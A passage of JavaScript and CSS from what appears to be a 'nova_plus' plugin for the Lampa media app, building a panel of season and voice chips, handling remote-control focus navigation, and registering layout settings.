        strip.attr('data-nova-source-top', stripTop).attr('data-nova-source-shift', delta)
          .css({ position: 'relative', top: delta ? delta + 'px' : '' });
      } catch (e) {}
    }

  }

  function wideRows() {
    var sig = wideSign();

    if (wide_sig === sig && ui.rows.children('.nova-plus__panel').length) return wideTouch();
    wide_sig = sig;
    wideMark();

    ui.rows.empty();
    var panel = $('<div class="nova-plus__panel"></div>');
    ui.rows.append(panel);
    chip_actions = {};
    wide_hold = null;

    var bar = $('<div class="nova-toolbar nova-plus__bar"></div>');
    if (!widePosBottom()) panel.append(bar);
    panel.toggleClass('nova-plus__panel--bottom', widePosBottom());

    var tool = function (key, title, value, extra, enter, long) {
      if (title) bar.append($('<div class="nova-toolbar__label"></div>').text(title));
      var box = chip(key, value, extra);
      chip_actions[key] = { enter: enter, long: long || null };
      bind(box, enter, long || null);
      bar.append(box);
      return box;
    };

    var group = function (title, name) {
      var block = $('<div class="nova-plus__group"></div>');
      if (name) block.attr('data-nova-group', name);
      if (title) block.append($('<div class="nova-plus__label"><span class="nova-plus__name"></span></div>').find('.nova-plus__name').text(title).end());
      var row = $('<div class="nova-plus__row"></div>');
      block.append(row);
      panel.append(block);
      return row;
    };

    var put = function (row, key, title, sub, extra, enter, long) {
      var box = wideChip(key, title, sub, extra);
      chip_actions[key] = { enter: enter, long: long || null };
      bind(box, enter, long || null);
      row.append(box);
      return box;
    };

    if (groups.season && groups.season.items.length > 1) {
      var seasons = group(serial ? (groups.season.title || label('nova_plus_seasons')) : label('nova_plus_parts'), 'season');
      groups.season.items.forEach(function (item, seat) {
        var index = typeof item.index === 'number' ? item.index : seat;
        var key = 'season:' + index;
        put(seasons, key, serial ? item.title : partTitle(item.title), '', { active: !!item.selected, plain: true }, function () {
          wideChooseOption('season', index, key);
        });
      });
    }

    if (groups.voice && groups.voice.items.length > 0) {
      var voices = group(groups.voice.title || label('nova_plus_voices'), 'voice');
      var order = groups.voice.items.map(function (item, seat) {
        return { item: item, index: typeof item.index === 'number' ? item.index : seat, seat: seat };
      });
      order.sort(function (a, b) { return (voiceRank(a.item.title) - voiceRank(b.item.title)) || (a.seat - b.seat); });
      order.forEach(function (entry) {
        var key = 'voice:' + entry.index;
        put(voices, key, entry.item.title, wideVoiceCount(entry.item) ? wideCount(wideVoiceCount(entry.item)) : '', { active: !!entry.item.selected, plain: true }, function () {
          wideChooseOption('voice', entry.index, key);
        });
      });
    }

    extras.forEach(function (entry, index) {
      var origin = entry.node;
      tool('extra:' + index, entry.label, entry.value, {}, function () { openExtra(index); }, function () {
        try { origin.trigger('hover:long'); } catch (e) {}
      });
    });

    if (groups.sort && groups.sort.length) {
      tool('source', '', '', {}, function () { uiToggle('source'); });
    }

    if (serial && !nav) {
      tool('order', label('nova_plus_order'), label(wideReverse() ? 'nova_plus_order_reverse' : 'nova_plus_order_straight'), { plain: true }, function () {
        save(WIDE_ORDER_KEY, wideReverse() ? 'straight' : 'reverse');
        lockFocus('order');
        redraw();
      });
    }

    if (!nav) {
      tool('look', label('nova_plus_look'), label(wideRow() ? 'nova_plus_look_row' : 'nova_plus_look_grid'), { plain: true }, function () {
        save(WIDE_LAYOUT_KEY, wideRow() ? 'grid' : 'row');
        lockFocus('look');
        redraw();
      });
    }

    if (wideResetable()) tool('reset', '', label('nova_plus_reset'), { plain: true }, wideReset);

    if (!nav && items.length > JUMP_FROM && !wideRow()) {
      var now = pageAt(pages(items.length), ui_page > 0 ? ui_page : 0);
      tool('jump', serial ? text('nova_jump', 'nova_plus_jump') : text('nova_files', 'nova_plus_files'), pageTitle(now), {}, function () { uiToggle('jump'); });
    }

    if (widePosBottom()) panel.append(bar);

    wideTouch();
  }

  function wideResetButton() {
    if (!root) return null;
    var box = root.find('.filter--reset').first();
    return box.length ? box : null;
  }

  function wideResetable() {
    if (wideResetButton() || wideReverse() || wideRow()) return true;
    return !!(groups.season || groups.voice || (groups.sort && groups.sort.length));
  }

  function wideHostReset() {
    if (!filter || !filter.nova_sets) return false;
    var list = filter.nova_sets.filter || [];
    for (var i = 0; i < list.length; i++) if (list[i] && list[i].reset) return true;
    return false;
  }

  function wideReset() {
    save(WIDE_ORDER_KEY, 'straight');
    save(WIDE_LAYOUT_KEY, 'grid');
    var box = wideResetButton();
    if (box) {
      try { box.trigger('hover:enter'); return; } catch (e) {}
    }
    if (filter && typeof filter.onSelect === 'function' && wideHostReset()) {
      ui_open = '';
      refreshCollection();
      lockFocus('reset');
      switchStart('reset');
      keepAlive(function () { filter.onSelect('filter', { reset: true }); });
      return;
    }
    lockFocus('reset');
    redraw();
  }

  function wideDropFrame() {
    try { if (ui.root) ui.root.remove(); } catch (e) {}
    ui = {};
    wide_sig = '';
    signature = '';
  }

  function wideItems() {
    var out = [];
    if (!inSkin()) return out;
    ui.rows.find('.selector').each(function () { if (shown(this)) out.push(this); });
    return out;
  }

  function wideNoteNodes() {
    var out = [];
    if (!inSkin() || !ui.list) return out;
    ui.list.find('.nova-note .nova-btn.selector').each(function () { if (shown(this)) out.push(this); });
    return out;
  }

  function wideListNodes() {
    var out = [];
    if (!inSkin()) return out;
    ui.list.find('.nova-card.selector').each(function () { if (shown(this)) out.push(this); });
    if (!out.length && !nav) out = wideNoteNodes();
    return out;
  }

  function wideStep(nodes, dir) {
    if (!nodes.length || !last) return null;
    var from = last.getBoundingClientRect();
    if (!from.width && !from.height) return null;
    var mid = from.left + from.width / 2;
    var tol = Math.max(6, from.height / 2);
    var line = null;
    var i, box;

    for (i = 0; i < nodes.length; i++) {
      if (nodes[i] === last) continue;
      box = nodes[i].getBoundingClientRect();
      if (!box.width && !box.height) continue;
      if (dir === 'up') {
        if (box.bottom > from.top + tol) continue;
        if (line === null || box.bottom > line) line = box.bottom;
      } else {
        if (box.top < from.bottom - tol) continue;
        if (line === null || box.top < line) line = box.top;
      }
    }
    if (line === null) return null;

    var best = null;
    var gap = 0;
    for (i = 0; i < nodes.length; i++) {
      if (nodes[i] === last) continue;
      box = nodes[i].getBoundingClientRect();
      if (!box.width && !box.height) continue;
      var edge = dir === 'up' ? box.bottom : box.top;
      if (Math.abs(edge - line) > tol) continue;
      var dist = Math.abs(box.left + box.width / 2 - mid);
      if (best === null || dist < gap) {
        best = nodes[i];
        gap = dist;
      }
    }
    return best;
  }

  function wideLineHead(node, prev) {
    try {
      var a = node.getBoundingClientRect();
      var b = prev.getBoundingClientRect();
      if ((!a.width && !a.height) || (!b.width && !b.height)) return false;
      var tol = Math.max(4, a.height / 2);
      return b.top < a.top - tol || b.left > a.left;
    } catch (e) {}
    return false;
  }

  function wideRowSide(dir) {
    if (!last) return null;

    var row = $(last).closest('.nova-plus__row,.nova-plus__bar,.nova-drop,.nova-note__actions');
    if (!row.length) return null;

    var nodes = [];
    row.find('.selector').each(function () { if (shown(this)) nodes.push(this); });
    var from = last.getBoundingClientRect();
    if (!from.width && !from.height) return null;

    var midY = from.top + from.height / 2;
    var midX = from.left + from.width / 2;
    var tolY = Math.max(6, from.height * 0.58);
    var best = null;
    var gap = Infinity;
    nodes.forEach(function (node) {
      if (node === last) return;
      var box = node.getBoundingClientRect();
      if (!box.width && !box.height) return;
      var y = box.top + box.height / 2;
      var x = box.left + box.width / 2;
      if (Math.abs(y - midY) > tolY) return;
      var distance = dir === 'right' ? x - midX : midX - x;
      if (distance < -tolY) return;
      if (distance < gap) {
        best = node;
        gap = distance;
      }
    });
    return best;
  }

  function wideOpenRow() {
    if (!inSkin() || !ui_open) return null;
    var row = ui.rows.find('.nova-drop').first();
    return row.length ? row : null;
  }

  function wideDropNodes() {
    var row = wideOpenRow();
    if (!row) return [];
    var out = [];
    row.find('.selector').each(function () { if (shown(this)) out.push(this); });
    return out;
  }

  function wideDropSide(dir) {
    var row = wideOpenRow();
    if (!row || !last || !row.find(last).length) return null;
    return wideRowSide(dir);
  }

  function wideEntry() {
    var row = wideOpenRow();
    if (!row) return null;
    var active = row.find('.nova-chip--active')[0];
    if (active && shown(active)) return active;
    var seat = null;
    row.find('.selector').each(function () { if (!seat && shown(this)) seat = this; });
    return seat;
  }

  function heroFocused() {
    if (!inSkin() || !last || !ui.hero_box) return false;
    return ui.hero_box.find(last).length > 0;
  }

  function wideHeroButtons() {
    var out = [];
    if (!ui.hero_box) return out;
    ui.hero_box.find('.nova-btn.selector').each(function () { if (shown(this)) out.push(this); });
    return out;
  }

  function wideToHero(nearest) {
    var buttons = wideHeroButtons();
    if (!buttons.length) return false;
    lockRelease();
    return focusNode(nearest ? buttons[buttons.length - 1] : buttons[0]);
  }

  function wideToHeroNear(node) {
    var buttons = wideHeroButtons();
    if (!buttons.length) return false;
    var seat = null;
    try {
      var from = node ? node.getBoundingClientRect() : null;
      if (from && (from.width || from.height)) {
        var mid = from.top + from.height / 2;
        var gap = 0;
        buttons.forEach(function (button) {
          var box = button.getBoundingClientRect();
          if (!box.width && !box.height) return;
          var dist = Math.abs(box.top + box.height / 2 - mid);
          if (seat === null || dist < gap) {
            seat = button;
            gap = dist;
          }
        });
      }
    } catch (e) { seat = null; }
    if (!seat) seat = buttons[buttons.length - 1];
    lockRelease();
    return focusNode(seat);
  }

  function wideToMenu() {
    try { Lampa.Controller.toggle('menu'); } catch (e) {}
    return true;
  }

  function wideToRows(bottom) {
    var nodes = wideItems();
    if (!nodes.length) return false;

    var active = null;
    if (!bottom) {
      var marked = ui.rows.find('.nova-chip--active')[0];
      if (marked && shown(marked)) active = marked;
    }
    if (!active) {
      var edge = null;
      nodes.forEach(function (node) {
        var box = node.getBoundingClientRect();
        if (edge === null) { edge = box.top; active = node; return; }
        if (bottom ? box.top > edge : box.top < edge) { edge = box.top; active = node; }
      });
    }
    if (!active) active = nodes[0];

    lockRelease();
    return focusNode(active);
  }

  function wideResumeCard() {
    var target = pickResume(items);
    if (target && target.card && target.card.length && shown(target.card)) return target.card;
    var first = ui.list.find('.nova-card.selector').first();
    if (first.length) return first;
    if (nav) {
      var seat = wideNoteNodes();
      return seat.length ? $(seat[0]) : null;
    }
    return null;
  }

  function wideDown() {
    if (!inSkin()) return false;

    var drop = wideOpenRow();
    if (drop && last && drop.find(last).length) {
      var belowDrop = wideStep(wideDropNodes(), 'down');
      if (belowDrop) return focusNode(belowDrop);
      var sourceButton = wideSourceChip();
      if (sourceButton && sourceButton.length) {
        try { sourceButton.trigger('hover:enter'); } catch (e) {}
      }
      var episode = wideResumeCard();
      if (episode) return focusNode(episode);
      return true;
    }

    if (heroFocused()) {
      var resume = wideResumeCard();
      if (!resume) return false;
      lockRelease();
      return focusNode(resume);
    }

    if (rowsFocused()) {
      var below = wideStep(wideItems(), 'down');
      if (below) return focusNode(below);
      var seats = wideNoteNodes();
      if (seats.length) {
        lockRelease();
        return focusNode(wideStep(seats, 'down') || seats[0]);
      }
      var target = wideResumeCard();
      if (!target) return false;
      lockRelease();
      return focusNode(target);
    }

    if (listFocused()) {
      var card = wideStep(wideListNodes(), 'down');
      if (card) return focusNode(card);
      return true;
    }

    return false;
  }

  function wideUp() {
    if (!inSkin()) return false;

    var drop = wideOpenRow();
    if (drop && last && drop.find(last).length) {
      var aboveDrop = wideStep(wideDropNodes(), 'up');
      if (aboveDrop) return focusNode(aboveDrop);
      var source = wideSourceChip();
      if (source && source.length && shown(source[0])) return focusNode(source[0]);
      return true;
    }

    if (listFocused()) {
      var card = wideStep(wideListNodes(), 'up');
      if (card) return focusNode(card);
      return wideToRows(true) || wideToHero(true);
    }

    if (rowsFocused()) {
      var above = wideStep(wideItems(), 'up');
      if (above) return focusNode(above);
      return false;
    }

    return false;
  }

  function wideSide(dir) {
    if (!inSkin()) return false;

    if (heroFocused()) {
      var buttons = wideHeroButtons();
      var at = buttons.indexOf(last);
      if (dir === 'right') {
        if (at !== -1 && at + 1 < buttons.length) return focusNode(buttons[at + 1]);
        var source = wideSourceChip();
        if (source && source.length && shown(source[0])) {
          lockRelease();
          return focusNode(source[0]);
        }
        return wideToRows() || true;
      }
      if (at > 0) return focusNode(buttons[at - 1]);
      return wideToMenu();
    }

    var drop = wideOpenRow();
    if (drop && last && drop.find(last).length) {
      var dropNext = wideDropSide(dir);
      if (dropNext) return focusNode(dropNext);
      if (dir === 'left') {
        var sourceChip = wideSourceChip();
        if (sourceChip && sourceChip.length && shown(sourceChip[0])) return focusNode(sourceChip[0]);
      }
      return true;
    }

    if (rowsFocused()) {
      var next = wideRowSide(dir);
      if (next) return focusNode(next);
      var ownRow = $(last).closest('.nova-plus__row');
      var grouped = ownRow.length && ownRow.closest('[data-nova-group="season"],[data-nova-group="voice"]').length;
      if (grouped && dir === 'left') {
        var here = last.getBoundingClientRect();
        var leftmost = true;
        ownRow.find('.selector').each(function () {
          if (this === last) return;
          var box = this.getBoundingClientRect();
          if (!box.width && !box.height) return;
          var sameLine = Math.abs((box.top + box.height / 2) - (here.top + here.height / 2)) <= Math.max(6, here.height * .58);
          if (sameLine && box.left < here.left - 2) leftmost = false;
        });
        if (leftmost) return wideToHeroNear(last) || true;
        return true;
      }
      if (grouped) return true;
      if (dir === 'left') return wideToHeroNear(last) || true;
      return true;
    }

    if (listFocused()) {
      var cards = wideListNodes();
      if (cards.indexOf(last) !== -1) {
        var step = wideRowSide(dir);
        if (step) return focusNode(step);
        if (dir === 'left') return wideToMenu();
        return true;
      }
      var seats = wideNoteNodes();
      if (seats.length && seats.indexOf(last) !== -1) {
        var noteStep = wideRowSide(dir);
        if (noteStep) return focusNode(noteStep);
        if (dir === 'left') return wideToMenu();
        return true;
      }
      try { if (window.Navigator && window.Navigator.canmove(dir)) return false; } catch (e) {}
      return true;
    }

    return true;
  }

  function wideSeen(node) {
    try {
      var clip = $(node).closest('.nova-plus__drop--scroll,.nova-plus__group--scroll');
      var target = clip.length ? clip[0] : node;
      var box = $(target).closest('.scroll');
      if (!box.length) return true;
      var frame = box[0].getBoundingClientRect();
      if (!frame.height) return true;
      var rect = target.getBoundingClientRect();
      if (!rect.height) return true;
      return rect.top >= frame.top - 1 && rect.bottom <= frame.bottom + 1;
    } catch (e) {}
    return true;
  }

  function widePageTop() {
    if (!ui.root || !ui.root.length) return false;
    var node = ui.root[0];
    try {
      var box = $(node).closest('.scroll');
      if (!box.length) return false;
      var top = node.getBoundingClientRect().top - box[0].getBoundingClientRect().top;
      if (top > -1) return false;
      var scroll = activeScroll(node);
      if (scroll) {
        scroll.update($(node), false);
        return true;
      }
      var body = box.find('.scroll__body').first();
      if (!body.length) return false;
      var style = body[0].style['-webkit-transform'] || body[0].style.transform || '';
      if (style.indexOf('translate') !== -1) {
        var pair = style.match(/-?[\d.]+px,\s*(-?[\d.]+)px/);
        var now = pair ? parseFloat(pair[1]) || 0 : 0;
        var next = Math.min(0, Math.round(now - top));
        body[0].style['-webkit-transform'] = 'translate3d(0px, ' + next + 'px, 0px)';
        body[0].style.transform = 'translate3d(0px, ' + next + 'px, 0px)';
      } else box[0].scrollTop = Math.max(0, box[0].scrollTop + top);
      return true;
    } catch (e) {}
    return false;
  }

  function widePanelNode(node) {
    try {
      if (node && ui.rows && ui.rows[0] && $.contains(ui.rows[0], node)) return true;
      if (node && ui.hero_box && ui.hero_box[0] && $.contains(ui.hero_box[0], node)) return true;
    } catch (e) {}
    return false;
  }

  function wideFollow(element) {
    if (!wideOn()) return false;
    var node = element instanceof jQuery ? element[0] : element;
    var drag = $(node).closest('[data-nova-drag]');
    if (drag.length) {
      if (drag.attr('data-nova-dragging') === '1') return true;
      if (drag.attr('data-nova-manual') === '1' && !pressNow()) return true;
      if (pressNow()) drag.removeAttr('data-nova-manual');
    }
    widePaneFollow(node);
    wideRowFollow(node);
    if (widePanelNode(node)) widePageTop();
    try {
      if (node && ui.rows && ui.rows[0] && $.contains(ui.rows[0], node)) return wideSeen(node);
    } catch (e) {}
    if (!wideRow()) return false;
    if (!ui.list || !ui.list.hasClass('nova__list--row')) return false;
    if (!node || !ui.list[0] || !$.contains(ui.list[0], node)) return false;
    try {
      var strip = ui.list.parent();
      var frame = (strip.length ? strip[0] : ui.list[0]).getBoundingClientRect();
      var box = node.getBoundingClientRect();
      var shift = parseFloat(ui.list.attr('data-nova-x')) || 0;
      var pad = Math.round(frame.width * 0.08) + 20;
      var limit = Math.min(0, frame.width - ui.list[0].scrollWidth);
      var next = shift;
      if (box.left - pad < frame.left) next = shift + (frame.left - box.left) + pad;
      else if (box.right + pad > frame.right) next = shift - (box.right - frame.right) - pad;
      next = Math.round(Math.max(limit, Math.min(0, next)));
      if (next === shift) return true;
      ui.list.attr('data-nova-x', next);
      ui.list[0].style['-webkit-transform'] = 'translate3d(' + next + 'px,0,0)';
      ui.list[0].style.transform = 'translate3d(' + next + 'px,0,0)';
    } catch (e) {}
    return true;
  }

  function wideStrip(list) {
    if (!wideOn() || !ui.list) return;
    if (wideRow() && !nav && list.length > 0) ui.list.addClass('nova__list--row');
    else ui.list.removeClass('nova__list--row');
    var strip = ui.list.parent();
    if (ui.list.hasClass('nova__list--row')) {
      wideDragBind(ui.list, 'x');
      strip.addClass('nova-plus__strip--clip');
    } else strip.removeClass('nova-plus__strip--clip');
    ui.list.attr('data-nova-x', 0);
    try { ui.list[0].style['-webkit-transform'] = ''; ui.list[0].style.transform = ''; } catch (e) {}
  }

  function wideSettings() {
    Lampa.SettingsApi.addParam({ component: 'nova_plus', param: { name: WIDE_LAYOUT_KEY, type: 'select', values: { grid: label('nova_plus_look_grid'), row: label('nova_plus_look_row') }, default: 'grid' }, field: { name: label('nova_plus_set_look'), description: label('nova_plus_set_look_descr') }, onChange: function () { redraw(); } });
    Lampa.SettingsApi.addParam({ component: 'nova_plus', param: { name: WIDE_ORDER_KEY, type: 'select', values: { straight: label('nova_plus_order_straight'), reverse: label('nova_plus_order_reverse') }, default: 'straight' }, field: { name: label('nova_plus_set_order'), description: label('nova_plus_set_order_descr') }, onChange: function () { redraw(); } });
    Lampa.SettingsApi.addParam({ component: 'nova_plus', param: { name: WIDE_META_KEY, type: 'trigger', default: true }, field: { name: label('nova_plus_set_meta'), description: label('nova_plus_set_meta_descr') }, onChange: function () { redraw(); } });
    Lampa.SettingsApi.addParam({ component: 'nova_plus', param: { name: WIDE_POS_KEY, type: 'select', values: { top: label('nova_plus_pos_top'), bottom: label('nova_plus_pos_bottom') }, default: 'top' }, field: { name: label('nova_plus_set_pos'), description: label('nova_plus_set_pos_descr') }, onChange: function () { redraw(); } });
  }

  var LOGO_CSS = ".nova-plus-root .nova-hero__title--logo>img.nova-logo--edge{-webkit-filter:drop-shadow(0 0 .02em rgba(255,255,255,.9)) drop-shadow(0 0 .06em rgba(255,255,255,.45)) drop-shadow(0 .04em .12em rgba(0,0,0,.5));filter:drop-shadow(0 0 .02em rgba(255,255,255,.9)) drop-shadow(0 0 .06em rgba(255,255,255,.45)) drop-shadow(0 .04em .12em rgba(0,0,0,.5))}";

  var LOGO_HOLD = '.nova-plus-root .nova-loading,.nova-plus-root .nova-note{width:100%;-webkit-box-flex:1;-webkit-flex:1 1 100%;-ms-flex:1 1 100%;flex:1 1 100%;min-width:0}'+
    '.nova-plus-root .nova-skeleton{width:100%;-webkit-box-flex:1;-webkit-flex:1 1 100%;-ms-flex:1 1 100%;flex:1 1 100%;min-width:0}'+
    '.nova-plus-root .nova-hero__title{min-height:2.3em}'+
    '.nova-plus-root .nova-hero__title--logo{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:end;-webkit-align-items:flex-end;-ms-flex-align:end;align-items:flex-end;min-height:2.3em}'+
    '.nova-plus-root .nova-hero__mark.nova-hero__title--logo{min-height:0}'+
    '@media screen and (max-width:580px){.nova-plus-root .nova-hero__title{min-height:2.1em}.nova-plus-root .nova-hero__title--logo{min-height:2.1em}}'+
    '.nova-plus-root .nova-skeleton--grid{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin:0 -.45em}'+
    '.nova-plus-root .nova-skeleton--grid .nova-skeleton__row{display:block;width:25%;margin:0 0 1em 0;padding:0 .45em;background:none;-webkit-border-radius:0;border-radius:0}'+
    '.nova-plus-root .nova-skeleton--grid .nova-skeleton__thumb{width:100%;height:0;padding-top:56%;-webkit-border-radius:.5em;border-radius:.5em}'+
    '.nova-plus-root .nova-skeleton--grid .nova-skeleton__body{padding:.5em .1em 0 .1em}'+
    '.nova-plus-root .nova-skeleton--grid .nova-skeleton__line{height:.8em;margin-bottom:.4em}'+
    '@media screen and (max-width:860px){.nova-plus-root .nova-skeleton--grid .nova-skeleton__row{width:33.3333%}}'+
    '@media screen and (max-width:580px){.nova-plus-root .nova-skeleton--grid .nova-skeleton__row{width:50%}}';

  var BADGE_CSS = [
    '.nova-plus-root .nova-chip__num{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;font-size:.74em;line-height:1.4;opacity:.45;margin-left:.6em}',
    '.nova-plus-root .nova-chip.focus .nova-chip__num{opacity:.6}',
    '.nova-plus-root .nova__list--grid .nova-card__num{padding:.45em 0 0 .5em;font-size:1em}',
    '.nova-plus-root .nova__list--grid .nova-card__side{top:.45em;right:.95em;text-align:right}',
    '.nova-plus-root .nova__list--grid .nova-card__num>span,.nova-plus-root .nova__list--grid .nova-card__quality{display:inline-block;font-size:1em;font-weight:600;line-height:1.3;letter-spacing:.02em;padding:.1em .42em;-webkit-border-radius:.35em;border-radius:.35em;background:rgba(10,11,17,.62);-webkit-box-shadow:0 .12em .45em rgba(0,0,0,.4);box-shadow:0 .12em .45em rgba(0,0,0,.4);text-shadow:none;color:#fff}',
    '.nova-plus-root .nova__list--grid .nova-card__thumb:not(.nova-card__thumb--loaded) .nova-card__num>span,.nova-plus-root .nova__list--grid .nova-card__thumb--fallback .nova-card__num>span{background:rgba(10,11,17,.62);padding:.1em .42em;-webkit-box-shadow:0 .12em .45em rgba(0,0,0,.4);box-shadow:0 .12em .45em rgba(0,0,0,.4)}'
  ].join('');

  var WIDE_CSS = ".nova-plus-scope .explorer__files-body .scroll__body>.nova-plus-root.nova-plus,.nova-plus{display:-webkit-flex!important;display:-ms-flexbox!important;display:flex!important;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-align-items:flex-start;-ms-flex-align:start;align-items:flex-start;padding:0 0 2em 0}.nova-plus>.nova__hero{-webkit-flex:0 0 41%;-ms-flex:0 0 41%;flex:0 0 41%;width:41%;max-width:41%;padding:0 1.6em 0 0}.nova-plus>.nova__rows{-webkit-flex:1 1 0%;-ms-flex:1 1 0%;flex:1 1 0%;width:59%;min-width:0;padding:.05em 0 0 0}.nova-plus>.nova-plus__strip{-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;width:100%;margin:1.05em 0 0 0;padding:.4em 0 .6em 1.05em;overflow:visible}.nova-plus>.nova-plus__strip--clip{overflow:hidden}.nova-plus .nova__list--row{-webkit-transition:-webkit-transform .25s;transition:transform .25s}.nova-skin-scope .explorer__files-body .scroll__body>.nova-plus-root,.z01-scope .explorer__files-body .scroll__body>.nova-plus-root{display:block!important}.nova-skin-scope .explorer__files-body .scroll__body>.nova-plus-root.nova-plus,.z01-scope .explorer__files-body .scroll__body>.nova-plus-root.nova-plus{display:-webkit-flex!important;display:-ms-flexbox!important;display:flex!important}.nova-plus-scope .explorer__files-body,.nova-plus-scope .explorer__files-body .scroll__content,.nova-plus-scope .explorer__files-body .scroll__body{-webkit-mask-image:none!important;mask-image:none!important}.nova-plus-scope .explorer__files-body .scroll__body{padding-top:.3em;padding-left:.3em}.nova-plus .nova__rows,.nova-plus-root .nova-plus__panel,.nova-plus .nova-plus__group,.nova-plus .nova-plus__row{overflow:visible}body.nova-plus-fade .nova-plus .nova-hero__bg,body.nova-plus-fade .nova-plus .nova-hero__shade{-webkit-mask-image:linear-gradient(90deg,transparent 0,#000 8%,#000 92%,transparent 100%),linear-gradient(180deg,transparent 0,#000 11%,#000 100%);mask-image:linear-gradient(90deg,transparent 0,#000 8%,#000 92%,transparent 100%),linear-gradient(180deg,transparent 0,#000 11%,#000 100%);-webkit-mask-composite:source-in;mask-composite:intersect}body.nova-plus-fade .nova-plus .nova-hero{-webkit-border-radius:0;border-radius:0;background:none}body.nova-plus-fade .nova-plus .nova-hero__body{padding-left:1.6em;padding-right:1.6em}body.nova-plus-fade .nova-plus .nova-hero__progress{left:0;right:0;bottom:0;-webkit-border-radius:0;border-radius:0}body.nova-plus-fade .nova-plus .nova-hero__season{margin-bottom:0}.nova-plus .nova-hero{min-height:0;margin:0;-webkit-border-radius:.95em;border-radius:.95em}.nova-plus .nova-hero__bg{position:relative;top:auto;left:auto;right:auto;bottom:auto;padding-top:58.5%}.nova-plus .nova-hero__bg img{position:absolute;top:0;left:0;width:100%;height:100%}.nova-plus .nova-hero__shade{background:-webkit-linear-gradient(bottom,rgba(10,11,17,.95) 0%,rgba(10,11,17,.56) 48%,rgba(10,11,17,0) 100%);background:linear-gradient(0deg,rgba(10,11,17,.95) 0%,rgba(10,11,17,.56) 48%,rgba(10,11,17,0) 100%)}.nova-plus .nova-hero__body{position:absolute;left:0;right:0;bottom:0;padding:1.05em 1.15em .9em 1.15em;max-width:100%;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column}.nova-plus .nova-hero--compact .nova-hero__body{position:relative;min-height:0;padding:1em 1.1em}.nova-plus .nova-hero__descr{display:none}.nova-plus .nova-hero__title{font-size:1.68em;margin-bottom:.42em;-webkit-line-clamp:1;max-width:72%}.nova-plus .nova-hero__title--logo{width:100%;max-width:100%;text-align:center}.nova-plus .nova-hero__title--logo>img{display:block;margin-left:auto;margin-right:auto;max-height:2.9em;max-width:86%;width:auto;-webkit-filter:drop-shadow(0 .15em .4em rgba(0,0,0,.5));filter:drop-shadow(0 .15em .4em rgba(0,0,0,.5))}.nova-plus .nova-hero__meta{position:absolute;top:.7em;right:.85em;left:auto;bottom:auto;z-index:3;margin:0;font-size:1em;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:nowrap;-ms-flex-wrap:nowrap;flex-wrap:nowrap;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-justify-content:flex-end;-ms-flex-pack:end;justify-content:flex-end;max-width:62%}.nova-plus .nova-hero__meta>*{margin:0 0 0 .9em;padding:0;opacity:.92;white-space:nowrap;background:none!important;-webkit-box-shadow:none!important;box-shadow:none!important;text-shadow:0 .08em .28em rgba(0,0,0,.9)}.nova-plus .nova-hero__actions{margin:0;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-align-items:center;-ms-flex-align:center;align-items:center;max-width:100%}.nova-plus .nova-hero__actions>.nova-btn{font-size:1.08em;padding:.56em 1.18em;margin:0 .55em .3em 0}.nova-plus .nova-hero__hint{-webkit-flex:0 1 auto;-ms-flex:0 1 auto;flex:0 1 auto;font-size:.98em;margin:0 0 .28em 0;min-width:0;white-space:nowrap;max-width:52%}.nova-plus .nova-hero__season{margin:.18em 0 0 .05em;font-size:.92em;opacity:.6}.nova-plus .nova-hero__progress{height:.28em}.nova-plus__group{margin:0 0 .72em 0}.nova-plus__label{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:baseline;-ms-flex-align:baseline;align-items:baseline;font-size:.9em;letter-spacing:.1em;text-transform:uppercase;opacity:.45;margin:0 0 .38em .1em}.nova-plus__name{min-width:0;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}.nova-plus__total{-webkit-flex:0 0 auto;-ms-flex:0 0 auto;flex:0 0 auto;margin:0 0 0 .9em;letter-spacing:.03em;text-transform:none;white-space:nowrap}.nova-plus__row{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap}.nova-plus .nova-plus__group--scroll{overflow:hidden}.nova-plus .nova-plus__row--scroll{-webkit-flex-wrap:nowrap;-ms-flex-wrap:none;flex-wrap:nowrap;-webkit-transition:-webkit-transform .25s;transition:transform .25s}.nova-plus .nova-plus__row--scroll>.nova-chip{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;margin-bottom:0}.nova-plus .nova-plus__row--pair{-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-content:flex-start;-ms-flex-line-pack:start;align-content:flex-start}.nova-plus .nova-plus__row--pair>.nova-chip{margin-bottom:.38em}.nova-plus-root .nova-chip{-webkit-border-radius:.52em;border-radius:.52em;padding:.3em .8em;margin:0 .42em .38em 0;max-width:none;-webkit-align-items:center;-ms-flex-align:center;align-items:center;background:rgba(255,255,255,.08);-webkit-box-shadow:inset 0 0 0 .08em rgba(255,255,255,.06);box-shadow:inset 0 0 0 .08em rgba(255,255,255,.06)}.nova-plus-root .nova-chip__stack{display:block;min-width:0}.nova-plus-root .nova-chip__stack .nova-chip__label{display:block;font-size:1em;line-height:1.2;padding:0}.nova-plus-root .nova-chip__sub{display:block;font-size:.72em;line-height:1.2;opacity:.5;white-space:nowrap}.nova-plus-root .nova-card__tag,.nova-plus-root .nova-card__tags>span,.nova-plus-root .nova-card__strip>span,.nova-plus-root .nova-card__head .nova-badge{background:rgba(10,11,17,.62)!important;-webkit-box-shadow:inset 0 0 0 .08em rgba(255,255,255,.08),0 .08em .28em rgba(0,0,0,.3);box-shadow:inset 0 0 0 .08em rgba(255,255,255,.08),0 .08em .28em rgba(0,0,0,.3)}.nova-plus-root .nova-chip.focus .nova-chip__sub{opacity:.65}.nova-plus-root 